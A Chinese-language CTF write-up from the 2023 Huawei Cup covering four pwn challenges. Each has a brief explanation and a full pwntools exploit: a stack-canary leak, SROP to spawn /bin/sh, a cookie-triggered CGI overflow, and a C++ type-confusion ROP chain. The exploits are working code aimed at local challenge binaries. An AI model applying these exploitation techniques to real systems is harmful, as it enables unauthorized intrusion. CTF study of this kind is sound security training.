# ez_ssp

题目存在非常明显的栈溢出漏洞，但是开启了`Canary`保护，因此无法直接利用栈溢出。并且允许执行三次栈溢出，剩下两次是通过`fork`函数，通过拷贝子进程进行执行的。

`fork`出的子进程有个特点，会与父进程生成的`Canary`值一致，刚开始考虑的时通过爆破获取`Canary`值，但是`Canary`的长度为八个字节，因此不够次数。但是在触发`Canary`保护时会有一个特点，如下图所示，会泄露出程序名，而程序名是存储在栈上面的。![image-20231001224503030](D:\ctf-competition\2023华为杯\2023华为WriteUp\image-20231001224503030.png)

并且该栈值刚好能够通过`gets`函数输入覆盖，因此只需要将该值覆盖为需要泄露的地址即可。

![image-20231001225200713](D:\ctf-competition\2023华为杯\2023华为WriteUp\image-20231001225200713.png)

## exp

```python
from pwn import *
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh = process("./pwn")
elf = ELF("pwn")
#gdb.attach(sh, "b*0x400B8B")
sh.recvuntil("ame?")
sh.send("\x00")
sh.recvuntil("nt to do?")
payload = "a" * 0x128
payload += p64(elf.got['puts'])
sh.sendline(payload)
sh.recvuntil("tected ***: ")
addr = u64(sh.recv(6).ljust(8,"\x00"))
log.info("addr:"+hex(addr))
libcbase = addr - libc.symbols['puts']
log.info("libcbase:"+hex(libcbase))


sh.recvuntil("ame?")
sh.send("\x00")
sh.recvuntil("nt to do?")
payload = "a" * 0x128
payload += p64(libcbase + libc.symbols['environ'])
sh.sendline(payload)
sh.recvuntil("tected ***: ")
addr = u64(sh.recv(6).ljust(8,"\x00"))
log.info("addr:"+hex(addr))

target = addr - 0x178
sh.recvuntil("ame?")
sh.send("\x00")
sh.recvuntil("id is: ")
xor = int(sh.recvuntil("\n", drop = True),10)
log.info("xor:"+str(xor))
sh.recvuntil("nt to do?")
payload = "a" * 0x128
payload += p64(target)
sh.sendline(payload)
sh.recvuntil("tected ***: ")
data = sh.recvuntil("terminated", drop=True)
print(data)
flag = ""
for i in data:
	try:
		flag += chr(ord(i) ^ xor)
	except:
		continue
print(flag)
sh.interactive()
```

# master-of-asm

题目提供了`syscall`指令与`/bin/sh`字符串的地址，并且系统调用号可以通过`read`函数控制，直接使用`srop`即可，需要弄清楚执行`sigreturn`时，栈上就是被伪造好的`Signal Frame`，并且`uc_flags`由于用不着因此被其余值填充也不影响。

![image-20231001225845931](D:\ctf-competition\2023华为杯\2023华为WriteUp\image-20231001225845931.png)

## exp

```c
from pwn import *
#0x0000000000401019 : syscall
context.arch = 'amd64'
syscall = 0x40102D 
sh = process("a.out")
attach(sh,"b*0x40101B")
raw_input()
sh.recvuntil("Hello Pwn")
sigframe = SigreturnFrame()
sigframe.rax = 59
sigframe.rdi = 0x40200A
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = 0x40200A
sigframe.rip = syscall
payload = p64(0x40101B) +'a'* 8+ str(sigframe)
raw_input()
sh.send(payload)
payload = p64(0x40102D) + 'a'*7
raw_input()
sh.send(payload)
sh.interactive()
```

# APACHE-CGI-PWN

这题只要设置了`cookie`就可以进行栈溢出的利用了，这里需要注意的时`cookie`名许需要设置为`ROOT-GOD`

## exp

```python
#coding:utf-8
from pwn import *
import requests

def pwn1():
    cookies = {
    'ROOT-GOD': "Every king's blood will end with a sword",
    }
    url='http://127.0.0.1:10086/getcookie.cgi'
    r=requests.get(url=url,cookies=cookies)
    print(r.text)
    if r.status_code == 200:
        print('POST请求成功！')
        print('响应内容：', r.text)
    else:
        print('POST请求失败。状态码：', r.status_code)

pwn1()

```

![image-20231001230812879](D:\ctf-competition\2023华为杯\2023华为WriteUp\image-20231001230812879.png)

# string_emulator

这题的考点是`c++`的类型混淆，但是`c++`的反汇编代码简直难看的不行，通过反复测试发现在功能`add`获取堆块时，可以选择类型，但是这两种类型获取的堆块，在`edit`功能中都用相同的方法进行处理，这就导致了类型混淆的漏洞了。在选择类型1进行新建堆块后，在进行`edit`功能可以直接修改需要`show`的地址，因此造成任意地址的泄露，这里会对第一个整型值做值校验，这里只需要设置为`0xffffffff`即可，因为存在整型溢出的漏洞。接着需要将堆块放到`unsortbin`上使得`bk`指针存在`libc`的地址，即可泄露`libc`地址，然后则是通过`libc`地址泄露栈地址与堆块的地址，栈地址通过`environ`变量泄露，而该变量的后方有`brk`函数所定义的堆块末尾地址。

接着是在`show`功能中存在`strcat`函数，这个函数所拼接的地址刚好是可以任意篡改用于泄露的地址，因此在泄露完上述地址后可以定义一个堆块，并且将该堆块地址用于`strcat`函数的拼接，从而造成栈溢出漏洞。这里需要注意几个点

- 程序不能输入截断符号并开启了沙盒，在使用`orw`时会受到限制，因此需要先通过`gets`函数对栈上进行输入`orw`的`gadget`
- 由于`cin`函数会将回车符作为一个输入的结束，并且`gets`函数的地址末尾恰好为`0x20`，但是通过调试可知在`gets`函数的上方`nop`指令，因此我们将`gets`函数的地址减一不会影响`gets`函数的调用
- `gets`函数有个特点，它会校验缓冲区内是否为回车符，若是有回车符会中断输入，感兴趣大家可以进行调试。因此在进行`cin`输入时使用空格作为分隔符
- 由于我们已经泄露的栈地址了，因此在调用`gets`函数时直接往存在`gadget`链的栈上输入即可

## exp

```python
from pwn import *

sh = process("./pwn")
#context.log_level = 'debug'
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

'''
0x000283e2 : pop eax ; ret
0x000a1101 : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x00163c1b : pop ebp ; pop ebx ; ret
0x000444c0 : pop ebp ; pop esi ; pop edi ; ret
'''
pop_ret = 0x000283e2
pop2_ret = 0x00163c1b
pop3_ret = 0x000444c0
pop4_ret = 0x000444bf

def add(choice, index, content):
	sh.recvuntil("ce:")
	sh.sendline("1")
	sh.recvuntil("pe ?")
	sh.sendline(str(choice))
	sh.recvuntil("ld")
	sh.sendline(str(index))
	sh.recvuntil("tent ?")
	sh.send(content + " ")

def show(index):
	sh.recvuntil("ce:")
	sh.sendline("3")
	sh.recvuntil("show?")
	sh.send(str(index) + " ")
	
def edit(index, content):
	sh.recvuntil("ce:")
	sh.sendline("2")
	sh.recvuntil("nge?")
	sh.sendline(str(index))
	sh.recvuntil("tent ?")
	sh.send(content + " ")

def edit1(index, content):
	sh.recvuntil("ce:")
	sh.sendline("2")
	sh.recvuntil("nge?")
	sh.sendline(str(index))
	sh.recvuntil("tent ?")
	sh.send(content + b" ")
	

for i in range(20):
	add(1,str(i),'a'*0x30) #0 - 19
for i in range(20):
	edit(str(i), 'a'*0x40)
add(1, 200, 'a'*0x3ff) #200
#attach(sh)
for i in range(20):
	edit1(str(i),p32(0xffffffff))
show(18)
sh.recvuntil("ONTENT: ")
addr = u32(sh.recv(4))
log.info("addr:"+hex(addr))
libcbase = addr - 0x1eb8f8
log.info("libcbase:"+hex(libcbase))
#attach(sh)
#raw_input()
target = libcbase + 0x1ed098 + 1
log.info("target:"+hex(target))
payload = p32(0xffffffff) + p32(target)
edit1(17, payload)

show(17)
#attach(sh)
sh.recvuntil("ONTENT: ")
addr = u32(sh.recv(3).rjust(4,b'\x00'))
log.info("addr:"+hex(addr))

payload = p32(0xffffffff) + p32(libcbase + libc.symbols['environ'])
edit1(17, payload)

show(17)
#attach(sh)
sh.recvuntil("ONTENT: ")
stack = u32(sh.recv(4))
log.info("addr:"+hex(stack))


payload = b'x'*4 + p32(target - 0x100) * 8 + p32(libc.symbols['gets'] +libcbase - 1 ) + p32(libcbase + pop4_ret) + p32(stack - 0x108 - 1)
log.info(hex(libc.symbols['gets'] + libcbase))
#raw_input()
edit1(17,payload)

edit1(16, p32(0xffffffff) + p32(addr - 0x1c630 + 1))
#attach(sh, "b*$rebase(0x2413)")
#raw_input()
show(16)

payload = p32(libcbase + libc.symbols['open']) + p32(libcbase + pop2_ret) + p32(stack - 0xd0) + p32(0)
payload += p32(libcbase + libc.symbols['read']) + p32(libcbase + pop3_ret) + p32(3) + p32(stack) + p32(0x100)
payload += p32(libcbase + libc.symbols['write']) + p32(libcbase + pop3_ret) + p32(1) + p32(stack) + p32(0x100)
payload += b"./flag"
#raw_input()
sh.sendline(payload)
#attach(sh)	

sh.interactive()
```

![image-20231001231104525](D:\ctf-competition\2023华为杯\2023华为WriteUp\image-20231001231104525.png)